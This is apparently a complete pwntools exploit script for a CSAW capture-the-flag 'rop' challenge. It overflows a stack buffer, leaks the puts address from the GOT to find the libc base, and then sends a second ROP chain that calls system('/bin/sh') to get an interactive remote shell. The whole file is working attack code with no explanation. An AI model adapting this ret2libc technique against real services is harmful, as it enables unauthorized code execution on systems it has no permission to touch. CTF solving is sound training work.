
from pwn import *

# r = process('./rop')
r = remote('pwn.chal.csaw.io', 5016)
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
lib = ELF('./libc-2.27.so')

puts_off = lib.symbols['puts']

puts_plt = 0x04004A0
puts_got = 0x0601018
main = 0x04005DC
pop_rdi = 0x0400683  # : pop rdi; ret;

p = b'A' * 40
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.readline()
r.sendline(p)
leak = r.recv().split()[0]

leak = int.from_bytes(leak, byteorder='little')

print(hex(leak))

LIBC_BASE = leak - puts_off
ADDR_BINSH = next(lib.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = lib.symbols['system'] + LIBC_BASE

print(hex(LIBC_BASE))
print(hex(ADDR_BINSH))
print(hex(ADDR_SYSTEM))

p = b'A' * 40
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
